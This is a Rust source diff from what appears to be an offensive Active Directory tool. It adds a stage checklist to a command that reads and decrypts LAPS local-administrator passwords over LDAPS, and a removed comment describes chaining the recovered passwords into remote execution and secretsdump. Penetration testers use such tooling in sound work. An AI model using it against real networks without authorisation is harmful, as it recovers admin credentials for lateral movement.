@@ -75,10 +75,44 @@ async fn decrypt_encrypted_laps(
 }
 
 /// Read LAPS local-administrator passwords over LDAPS — one host (`--target WIN11$`) or every
-/// computer whose LAPS attribute the bind identity can read. Ubiquitous instant-local-admin;
-/// chain the cleartext into `attack exec`/`secretsdump` as the local Administrator.
-pub(crate) async fn laps(mut a: LapsArgs) -> Result<()> {
+/// computer whose LAPS attribute the bind identity can read. Wraps `laps_impl` with a rich
+/// per-stage checklist so the operator sees where the pipeline stopped (bad channel, no entries
+/// readable, GKDI GetKey denied).
+pub(crate) async fn laps(a: LapsArgs) -> Result<()> {
+    let mut checklist = ui::StageChecklist::new([
+        "resolve password",
+        "sealed LDAP bind (LDAPS)",
+        "read LAPS attributes",
+        "decrypt / emit passwords",
+    ]);
+    let result = laps_impl(a, &mut checklist).await;
+    match &result {
+        Ok(()) => checklist.render("LAPS stages"),
+        Err(e) => {
+            let brief = format!("{e:#}")
+                .lines()
+                .next()
+                .unwrap_or("failed")
+                .chars()
+                .take(80)
+                .collect::<String>();
+            checklist.mark_current_failed(brief);
+            checklist.render("LAPS stages (failed)");
+        }
+    }
+    result
+}
+
+async fn laps_impl(mut a: LapsArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
     a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
+    checklist.record_ok(
+        "resolve password",
+        if a.password.is_empty() {
+            "empty"
+        } else {
+            "resolved"
+        },
+    );
     use adhammer_collector::{Collector, LdapConfig};
     let cfg = LdapConfig {
         url: a.url.clone(),
@@ -90,8 +124,17 @@ pub(crate) async fn laps(mut a: LapsArgs) -> Result<()> {
     };
     let sp = ui::Spinner::start("reading LAPS passwords over LDAPS");
     let mut c = Collector::connect(&cfg).await?;
+    checklist.record_ok("sealed LDAP bind (LDAPS)", format!("→ {}", a.url));
     let entries = c.read_laps(a.target.as_deref()).await?;
     sp.done(&format!("{} LAPS entr(y/ies) returned", entries.len()));
+    checklist.record_ok(
+        "read LAPS attributes",
+        format!(
+            "{} entr{}",
+            entries.len(),
+            if entries.len() == 1 { "y" } else { "ies" }
+        ),
+    );
     if entries.is_empty() {
         anyhow::bail!(
             "no LAPS password readable (no LAPS deployed, or the bind identity lacks the read right — try a specific --target <HOST$>)"
@@ -150,6 +193,10 @@ pub(crate) async fn laps(mut a: LapsArgs) -> Result<()> {
             ),
         }
     }
+    checklist.record_ok(
+        "decrypt / emit passwords",
+        format!("{cleartext} cleartext recovered"),
+    );
     ui::ok(&format!(
         "LAPS: {cleartext} cleartext local-admin password(s) recovered"
     ));
